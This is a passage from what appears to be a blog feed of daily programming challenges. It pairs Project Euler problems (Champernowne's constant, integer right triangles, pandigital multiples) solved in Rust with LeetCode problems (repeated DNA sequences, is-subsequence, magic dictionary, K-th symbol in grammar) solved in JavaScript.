Primes::all().take(up_bd) &#123;</span><br><span class="line">        <span class="keyword">if</span> is_pandigital(i) &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, i);</span><br><span class="line">            ans = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">is_pandigital</span></span>(n: <span class="built_in">usize</span>) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="comment">// println!("n = &#123;&#125;", n);</span></span><br><span class="line">    <span class="keyword">let</span> l = n.to_string().len();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..(l+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = n;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> is_ok = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span> tmp != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> tmp % <span class="number">10</span> == i &amp;&amp; is_ok == <span class="literal">false</span> &#123;</span><br><span class="line">                is_ok = <span class="literal">true</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> tmp % <span class="number">10</span> == i &amp;&amp; is_ok == <span class="literal">true</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// println!("&#123;&#125;", tmp);</span></span><br><span class="line">            tmp /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> !is_ok &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="187-Repeated-DNA-Sequences"><a href="#187-Repeated-DNA-Sequences" class="headerlink" title="187. Repeated DNA Sequences"></a>187. Repeated DNA Sequences</h3><p>All DNA is composed of a series of nucleotides abbreviated as A, C, G, and T, for example: &quot;ACGAATTCCG&quot;. When studying DNA, it is sometimes useful to identify repeated sequences within the DNA.</p><p>Write a function to find all the 10-letter-long sequences (substrings) that occur more than once in a DNA molecule.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT&quot;</span><br><span class="line"></span><br><span class="line">Output: [&quot;AAAAACCCCC&quot;, &quot;CCCCCAAAAA&quot;]</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @return &#123;string[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> findRepeatedDnaSequences = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= s.length<span class="number">-10</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = s.substr(i, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (set.has(tmp)) ans.add(tmp);</span><br><span class="line">    set.add(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(ans);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-29 Daily Challenge</title>
      <link href="/2019-01-29-Daily-Challenge/"/>
      <url>/2019-01-29-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Champernowne&#39;s constant</em> in <em>Rust</em> and <em><del>Sudoku Solver</del>Is Subsequence</em> in <em>JavaScript</em>.</p><p>I need more practice to write my own Dancing Link is JS.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Champernowne-39-s-constant"><a href="#Champernowne-39-s-constant" class="headerlink" title="Champernowne&#39;s constant"></a>Champernowne&#39;s constant</h3><h3 id="Problem-40"><a href="#Problem-40" class="headerlink" title="Problem 40"></a>Problem 40</h3><p>An irrational decimal fraction is created by concatenating the positive integers:</p><p>0.123456789101112131415161718192021...</p><p>It can be seen that the 12th digit of the fractional part is 1.</p><p>If <em>d**n</em> represents the <em>n</em>th digit of the fractional part, find the value of the following expression.</p><p><em>d</em>1 × <em>d</em>10 × <em>d</em>100 × <em>d</em>1000 × <em>d</em>10000 × <em>d</em>100000 × <em>d</em>1000000</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">7</span> &#123;</span><br><span class="line">        ans *= getdigit(<span class="number">10i32</span>.pow(i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">getdigit</span></span>(n: <span class="built_in">i32</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cur: <span class="built_in">i32</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> s: <span class="built_in">i32</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> s &lt; n &#123;</span><br><span class="line">        cur = s;</span><br><span class="line">        index += <span class="number">1</span>;</span><br><span class="line">        s += <span class="number">9</span>*<span class="number">10i32</span>.pow(index <span class="keyword">as</span> <span class="built_in">u32</span> - <span class="number">1</span>) * (index <span class="keyword">as</span> <span class="built_in">i32</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> h = n - cur - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> t = <span class="number">10i32</span>.pow(index-<span class="number">1</span>) + h / (index <span class="keyword">as</span> <span class="built_in">i32</span>);</span><br><span class="line">    <span class="keyword">let</span> p = (h % (index <span class="keyword">as</span> <span class="built_in">i32</span>)) <span class="keyword">as</span> <span class="built_in">usize</span>;</span><br><span class="line">    <span class="keyword">let</span> ans = t.to_string().as_bytes()[p];</span><br><span class="line">    <span class="keyword">let</span> ans = ans <span class="keyword">as</span> <span class="built_in">char</span>;</span><br><span class="line">    <span class="keyword">let</span> ans = ans.to_digit(<span class="number">10</span>).unwrap();</span><br><span class="line">    ans <span class="keyword">as</span> <span class="built_in">i32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="392-Is-Subsequence"><a href="#392-Is-Subsequence" class="headerlink" title="392. Is Subsequence"></a>392. Is Subsequence</h3><p>Medium</p><p>Given a string <strong>s</strong> and a string <strong>t</strong>, check if <strong>s</strong> is subsequence of <strong>t</strong>.</p><p>You may assume that there is only lower case English letters in both <strong>s</strong> and <strong>t</strong>. <strong>t</strong> is potentially a very long (length ~= 500,000) string, and <strong>s</strong> is a short string (&lt;=100).</p><p>A subsequence of a string is a new string which is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (ie, <code>&quot;ace&quot;</code> is a subsequence of <code>&quot;abcde&quot;</code>while <code>&quot;aec&quot;</code> is not).</p><p><strong>Example 1:</strong><br><strong>s</strong> = <code>&quot;abc&quot;</code>, <strong>t</strong> = <code>&quot;ahbgdc&quot;</code></p><p>Return <code>true</code>.</p><p><strong>Example 2:</strong><br><strong>s</strong> = <code>&quot;axc&quot;</code>, <strong>t</strong> = <code>&quot;ahbgdc&quot;</code></p><p>Return <code>false</code>.</p><p><strong>Follow up:</strong><br>If there are lots of incoming S, say S1, S2, ... , Sk where k &gt;= 1B, and you want to check one by one to see if T has its subsequence. In this scenario, how would you change your code?</p><p><strong>Credits:</strong><br>Special thanks to <a href="https://leetcode.com/pbrother/" target="_blank" rel="noopener">@pbrother</a> for adding this problem and creating all test cases.</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; t</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> isSubsequence = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cur = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; t.length &amp;&amp; cur &lt; s.length; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t.charAt(i) === s.charAt(cur)) ++cur;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cur === s.length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(isSubsequence("abc","ahbgdc"));</span></span><br><span class="line"><span class="comment">// console.log(isSubsequence("axc","ahbgdc"));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-28 Daily Challenge</title>
      <link href="/2019-01-28-Daily-Challenge/"/>
      <url>/2019-01-28-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Integer right triangles</em> in <em>Rust</em> and <em>Implement Magic Dictionary</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Integer-right-triangles"><a href="#Integer-right-triangles" class="headerlink" title="Integer right triangles"></a>Integer right triangles</h3><h3 id="Problem-39"><a href="#Problem-39" class="headerlink" title="Problem 39"></a>Problem 39</h3><p>If <em>p</em> is the perimeter of a right angle triangle with integral length sides, {<em>a</em>,<em>b</em>,<em>c</em>}, there are exactly three solutions for <em>p</em> = 120.</p><p>{20,48,52}, {24,45,51}, {30,40,50}</p><p>For which value of <em>p</em> ≤ 1000, is the number of solutions maximised?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">12</span>..<span class="number">1001</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">1</span>..i &#123;</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> (<span class="number">2</span>..i).rev() &#123;</span><br><span class="line">                <span class="keyword">let</span> l = i-j-k;</span><br><span class="line">                <span class="keyword">if</span> k &lt;= j &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> l &lt;= k &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// println!("&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;", i, j, k, l);</span></span><br><span class="line">                <span class="keyword">if</span> l*l == j*j+k*k &#123;</span><br><span class="line">                    tmp += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> tmp &gt; cnt &#123;</span><br><span class="line">            ans = i;</span><br><span class="line">            cnt = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// println!("&#123;&#125;, &#123;&#125;", i, tmp);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="676-Implement-Magic-Dictionary"><a href="#676-Implement-Magic-Dictionary" class="headerlink" title="676. Implement Magic Dictionary"></a>676. Implement Magic Dictionary</h3><p>Implement a magic directory with <code>buildDict</code>, and <code>search</code>methods.</p><p>For the method <code>buildDict</code>, you&#39;ll be given a list of non-repetitive words to build a dictionary.</p><p>For the method <code>search</code>, you&#39;ll be given a word, and judge whether if you modify <strong>exactly</strong> one character into <strong>another</strong> character in this word, the modified word is in the dictionary you just built.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: buildDict([&quot;hello&quot;, &quot;leetcode&quot;]), Output: Null</span><br><span class="line">Input: search(&quot;hello&quot;), Output: False</span><br><span class="line">Input: search(&quot;hhllo&quot;), Output: True</span><br><span class="line">Input: search(&quot;hell&quot;), Output: False</span><br><span class="line">Input: search(&quot;leetcoded&quot;), Output: False</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ol><li>You may assume that all the inputs are consist of lowercase letters <code>a-z</code>.</li><li>For contest purpose, the test data is rather small by now. You could think about highly efficient algorithm after the contest.</li><li>Please remember to <strong>RESET</strong> your class variables declared in class MagicDictionary, as static/class variables are <strong>persisted across multiple test cases</strong>. Please see <a href="https://leetcode.com/faq/#different-output" target="_blank" rel="noopener">here</a> for more details.</li></ol><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Initialize your data structure here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> MagicDictionary = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.set) <span class="keyword">this</span>.set.clear();</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">this</span>.set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Build a dictionary through a list of words</span></span><br><span class="line"><span class="comment"> * @param &#123;string[]&#125; dict</span></span><br><span class="line"><span class="comment"> * @return &#123;void&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MagicDictionary.prototype.buildDict = <span class="function"><span class="keyword">function</span>(<span class="params">dict</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> w <span class="keyword">of</span> dict) &#123;</span><br><span class="line">    <span class="keyword">this</span>.set.add(w);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns if there is any word in the trie that equals to the given word after modifying exactly one character</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; word</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MagicDictionary.prototype.search = <span class="function"><span class="keyword">function</span>(<span class="params">word</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> isOK = <span class="function">(<span class="params">w1, w2</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (w1.length !== w2.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; w1.length; ++i) &#123;</span><br><span class="line">      <span class="keyword">if</span> (w1.charAt(i) !== w2.charAt(i)) ++cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt === <span class="number">1</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> w <span class="keyword">of</span> <span class="keyword">this</span>.set) &#123;</span><br><span class="line">    <span class="keyword">if</span> (w.length === word.length &amp;&amp; isOK(w, word)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MagicDictionary object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * var obj = Object.create(MagicDictionary).createNew()</span></span><br><span class="line"><span class="comment"> * obj.buildDict(dict)</span></span><br><span class="line"><span class="comment"> * var param_2 = obj.search(word)</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-27 Daily Challenge</title>
      <link href="/2019-01-27-Daily-Challenge/"/>
      <url>/2019-01-27-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Pandigital multiples</em> in <em>Rust</em> and <em>K-th Symbol in Grammar</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Pandigital-multiples"><a href="#Pandigital-multiples" class="headerlink" title="Pandigital multiples"></a>Pandigital multiples</h3><h3 id="Problem-38"><a href="#Problem-38" class="headerlink" title="Problem 38"></a>Problem 38</h3><p>Take the number 192 and multiply it by each of 1, 2, and 3:</p><blockquote><p>192 × 1 = 192<br>192 × 2 = 384<br>192 × 3 = 576</p></blockquote><p>By concatenating each product we get the 1 to 9 pandigital, 192384576. We will call 192384576 the concatenated product of 192 and (1,2,3)</p><p>The same can be achieved by starting with 9 and multiplying by 1, 2, 3, 4, and 5, giving the pandigital, 918273645, which is the concatenated product of 9 and (1,2,3,4,5).</p><p>What is the largest 1 to 9 pandigital 9-digit number that can be formed as the concatenated product of an integer with (1,2, ... , n) where n &gt; 1?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">918273645</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">10000</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp: <span class="built_in">String</span> = <span class="built_in">String</span>::new();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> j = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> tmp.len() &lt; <span class="number">9</span> &#123;</span><br><span class="line">            tmp = <span class="built_in">format!</span>(<span class="string">"&#123;&#125;&#123;&#125;"</span>, tmp, i*j);</span><br><span class="line">            j += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> tmp.len() != <span class="number">9</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> tmp_n = tmp.parse::&lt;<span class="built_in">i32</span>&gt;().unwrap();</span><br><span class="line">        <span class="keyword">if</span> tmp_n &gt; ans &amp;&amp; is_pandigital(&amp;tmp) &#123;</span><br><span class="line">            ans = tmp_n;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">"&#123;&#125;, &#123;&#125;"</span>, i, tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">is_pandigital</span></span>(s: &amp;<span class="built_in">String</span>) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> NUMS: [<span class="built_in">char</span>; <span class="number">9</span>] = [<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>];</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> &amp;NUMS &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s.chars() &#123;</span><br><span class="line">            <span class="keyword">if</span> i == *c &#123;</span><br><span class="line">                cnt += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> cnt != <span class="number">1</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="779-K-th-Symbol-in-Grammar"><a href="#779-K-th-Symbol-in-Grammar" class="headerlink" title="779. K-th Symbol in Grammar"></a>779. K-th Symbol in Grammar</h3><p>On the first row, we write a <code>0</code>. Now in every subsequent row, we look at the previous row and replace each occurrence of <code>0</code> with <code>01</code>, and each occurrence of <code>1</code> with <code>10</code>.</p><p>Given row <code>N</code> and index <code>K</code>, return the <code>K</code>-th indexed symbol in row <code>N</code>. (The values of <code>K</code> are 1-indexed.) (1 indexed).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Examples:</span><br><span class="line">Input: N = 1, K = 1</span><br><span class="line">Output: 0</span><br><span class="line"></span><br><span class="line">Input: N = 2, K = 1</span><br><span class="line">Output: 0</span><br><span class="line"></span><br><span class="line">Input: N = 2, K = 2</span><br><span 